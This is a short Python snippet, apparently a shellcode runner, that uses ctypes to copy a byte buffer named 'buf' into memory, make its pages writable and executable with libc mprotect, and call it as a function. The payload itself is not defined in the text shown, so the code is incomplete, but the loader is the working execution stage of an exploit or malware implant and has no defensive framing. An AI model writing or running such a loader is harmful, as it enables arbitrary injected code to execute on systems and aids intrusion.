from ctypes import *



mem_with_shell = create_string_buffer(buf, len(buf))
shell = cast(mem_with_shell, CFUNCTYPE(c_void_p))

addr = cast(mem_with_shell, c_void_p).value
libc = CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize
for page_start in range(addr_page, addr + len(buf), pagesize):
    assert libc.mprotect(page_start, pagesize, 0x7) == 0
shell()
